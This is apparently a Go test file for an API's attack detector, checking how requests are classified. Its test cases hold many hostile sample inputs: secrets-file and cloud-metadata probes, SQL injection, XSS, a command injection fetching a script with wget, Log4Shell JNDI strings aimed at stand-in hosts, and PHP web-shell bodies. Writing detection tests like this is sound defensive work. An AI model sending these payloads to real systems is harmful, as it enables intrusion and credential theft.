package attack

import (
	"net/http"
	"strings"
	"testing"
)

const firefox = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0"

func TestCheck(t *testing.T) {
	unmatched := func(path, query string) Request {
		return Request{Path: path, RawQuery: query, Header: http.Header{"User-Agent": {firefox}}, Payload: true, Probe: true}
	}
	failed := func(path, query string) Request {
		return Request{Path: path, RawQuery: query, Header: http.Header{"User-Agent": {firefox}}, Payload: true}
	}
	ok := func(path, query string) Request {
		return Request{Path: path, RawQuery: query, Header: http.Header{"User-Agent": {firefox}}}
	}
	withHeader := func(r Request, name, value string) Request {
		r.Header = r.Header.Clone()
		r.Header.Set(name, value)
		return r
	}
	withBody := func(r Request, body string) Request {
		r.Body = []byte(body)
		return r
	}
	for _, c := range []struct {
		name     string
		request  Request
		kind, in string
	}{
		// Probes for what the API does not have.
		{"env file", unmatched("/.env", ""), SecretsFile, InPath},
		{"env file in a folder", unmatched("/laravel/.env.production", ""), SecretsFile, InPath},
		{"aws credentials", unmatched("/.aws/credentials", ""), SecretsFile, InPath},
		{"wp-config is a secret, not just WordPress", unmatched("/wp-config.php.bak", ""), SecretsFile, InPath},
		{"git config", unmatched("/.git/config", ""), SourceControl, InPath},
		{"database dump", unmatched("/backup.sql", ""), BackupFile, InPath},
		{"site archive", unmatched("/site.tar.gz", ""), BackupFile, InPath},
		{"wordpress login", unmatched("/wp-login.php", ""), WordPress, InPath},
		{"xmlrpc", unmatched("/xmlrpc.php", ""), WordPress, InPath},
		{"phpmyadmin", unmatched("/phpmyadmin/index.php", ""), AdminPanel, InPath},
		{"spring actuator", unmatched("/actuator/env", ""), ExploitProbe, InPath},
		{"phpunit rce", unmatched("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", ""), ExploitProbe, InPath},
		{"cloud metadata", unmatched("/latest/meta-data/iam/security-credentials/", ""), ExploitProbe, InPath},
		{"any php", unmatched("/index.php", ""), ScriptProbe, InPath},
		{"web shell", unmatched("/wp-content/uploads/shell.php", ""), WebShell, InPath},
		{"double encoded traversal", unmatched("/static/%252e%252e%252fetc%252fpasswd", ""), PathTraversal, InPath},
		{"traversal in the query", unmatched("/download", "file=../../../../etc/passwd"), PathTraversal, InQuery},

		// Payloads on a real endpoint that failed.
		{"sql in a lookup", failed("/v1/pincode/600001'%20OR%20'1'='1", ""), SQLInjection, InPath},
		{"union select", failed("/v1/banks", "q=1%20UNION%20ALL%20SELECT%20NULL,NULL--"), SQLInjection, InQuery},
		{"time based sql", failed("/v1/ifsc/SBIN0000001", "x=1)%20AND%20SLEEP(5)"), SQLInjection, InQuery},
		{"script tag", failed("/v1/rto/%3Cscript%3Ealert(1)%3C/script%3E", ""), XSS, InPath},
		{"event handler", failed("/v1/hsn", "q=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E"), XSS, InQuery},
		{"command injection", failed("/v1/whois/example.com;wget%20http://1.2.3.4/x.sh", ""), CommandInjection, InPath},
		{"template injection", failed("/v1/holidays", "year={{7*7}}"), TemplateInject, InQuery},

		// Anywhere, even on a successful request.
		{"log4shell in a header", withHeader(ok("/v1/logos/TCS", ""), "X-Api-Version", "${jndi:ldap://evil.example/a}"), Log4Shell, InHeader},
		{"obfuscated log4shell", withHeader(ok("/", ""), "Referer", "${${lower:j}ndi:${lower:l}dap://x/a}"), Log4Shell, InHeader},
		{"log4shell in the query", ok("/v1/pincode/600001", "q=%24%7Bjndi%3Armi%3A%2F%2Fx%2Fa%7D"), Log4Shell, InQuery},
		{"sqlmap", withHeader(ok("/v1/banks", ""), "User-Agent", "sqlmap/1.8.2#stable (https://sqlmap.org)"), ScannerTool, InUserAgent},
		{"nuclei", withHeader(ok("/", ""), "User-Agent", "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))"), ScannerTool, InUserAgent},

		// Bodies sent to paths the API does not have.
		{"php in a body", withBody(unmatched("/upload", ""), "<?php system($_GET['c']); ?>"), WebShell, InBody},
		{"form with sql", withBody(unmatched("/login", ""), "user=admin%27%20OR%201%3D1--&pass=x"), SQLInjection, InBody},
		{"login guesses are only a probe", withBody(unmatched("/wp-login.php", ""), "log=admin&pwd=admin123"), WordPress, InPath},

		// Not attacks.
		{"home page", unmatched("/", ""), "", ""},
		{"favicon", unmatched("/apple-touch-icon.png", ""), "", ""},
		{"compressed sitemap", unmatched("/sitemap.xml.gz", ""), "", ""},
		{"well-known", unmatched("/.well-known/security.txt", ""), "", ""},
		{"logo for a company named Shell", failed("/v1/logos/SHELL", ""), "", ""},
		{"logo for ADMIN", failed("/v1/logos/ADMIN", ""), "", ""},
		{"regex with SQL on purpose", ok("/v1/regex", "pattern=union%20select&text=x"), "", ""},
		{"code image of a script", ok("/v1/code-image", "code=%3Cscript%3Ealert(1)%3C/script%3E"), "", ""},
		{"apostrophe in a name", failed("/v1/companies", "q=Dr.%20Reddy's%20Laboratories"), "", ""},
		{"python-httpx is not a scanner", withHeader(ok("/mcp", ""), "User-Agent", "python-httpx/0.28.1"), "", ""},
		{"dollar in text", ok("/v1/words", "text=costs%20${price}"), "", ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			got := Check(c.request)
			if got.Type != c.kind || got.In != c.in {
				t.Fatalf("Check = %q in %q (%q), want %q in %q", got.Type, got.In, got.Snippet, c.kind, c.in)
			}
			if c.kind != "" && got.Snippet == "" {
				t.Error("a finding without a snippet")
			}
		})
	}
}

// Headers that hold credentials or the caller's address are never searched, so they
// can never end up in a snippet.
func TestCheckSkipsPrivateHeaders(t *testing.T) {
	for _, name := range []string{"Authorization", "Cookie", "X-Forwarded-For", "CF-Connecting-IP"} {
		r := Request{Path: "/", Header: http.Header{http.CanonicalHeaderKey(name): {"${jndi:ldap://203.0.113.9/a}"}}}
		if got := Check(r); got.Type != "" {
			t.Errorf("%s was searched: %+v", name, got)
		}
	}
}

func TestSnippet(t *testing.T) {
	long := strings.Repeat("a", 500) + " UNION SELECT " + strings.Repeat("b", 500)
	got := Check(Request{RawQuery: "q=" + long, Payload: true})
	if got.Type != SQLInjection || len([]rune(got.Snippet)) != SnippetLength || !strings.Contains(got.Snippet, "UNION SELECT") {
		t.Errorf("snippet of a long query: %q (%d)", got.Snippet, len([]rune(got.Snippet)))
	}
	got = Check(Request{Body: []byte("x=1\n\r\t<?php eval($_POST['a']);"), Probe: true})
	if got.Type != WebShell || strings.ContainsAny(got.Snippet, "\n\r\t") {
		t.Errorf("control characters kept: %q", got.Snippet)
	}
}
